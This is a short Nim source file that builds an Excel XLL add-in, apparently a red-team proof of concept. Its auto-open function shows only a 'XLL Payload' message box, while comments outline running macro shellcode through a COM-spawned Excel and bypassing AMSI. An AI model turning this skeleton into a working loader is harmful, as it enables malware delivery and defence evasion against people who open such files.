#[
    Compile:
        nim c -d=mingw --app=lib --nomain --cpu=amd64 nim_xll.nim
    
    Will compile as a DLL, you can then just change the extension to .xll
    Idea: Using COM, open Excel, which will be a child process of the Excel used to open this XLL, and then run macro shellcode
    ^ AMSI may still need to be bypassed
]#

import winim/lean

proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
    MessageBox(0, "If you're seeing this, it's already too late", "XLL Payload", 0)

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()

  return true